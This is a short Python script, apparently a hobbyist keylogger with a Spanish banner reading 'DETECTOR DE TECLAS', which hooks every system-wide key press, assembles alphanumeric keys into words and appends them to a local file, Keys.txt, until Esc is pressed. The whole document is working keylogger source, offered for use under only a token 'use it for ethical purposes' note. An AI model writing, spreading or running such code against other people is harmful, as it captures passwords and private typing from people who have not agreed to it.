import keyboard as key
import pyfiglet
result = pyfiglet.figlet_format("DETECTOR DE TECLAS", font="small")

Palabras = []
print(f"""
---------------------------------------------------------------------------------------

{result}

    
VERSION: 0.1
HECHO POR EL TORTAS
Nota: USALO PARA FINES ETICOS!!!!
---------------------------------------------------------------------------------------
""")
def on():
    global Palabras
    tecla = ''.join(Palabras)
    print("Palabras:", tecla)
    with open("Keys.txt", "a") as file:
        file.write(tecla + "\n")
    Palabras = []

def on_key(event):
    global Palabras
    if event.event_type == 'down':
        if event.name == 'space':
            on()
        elif event.name.isalnum():
            Palabras.append(event.name)

key.hook(on_key)

try:
    key.wait('esc')
    print("Enviado a Keys.txt")
except KeyboardInterrupt:
    print("script detenido")
    pass
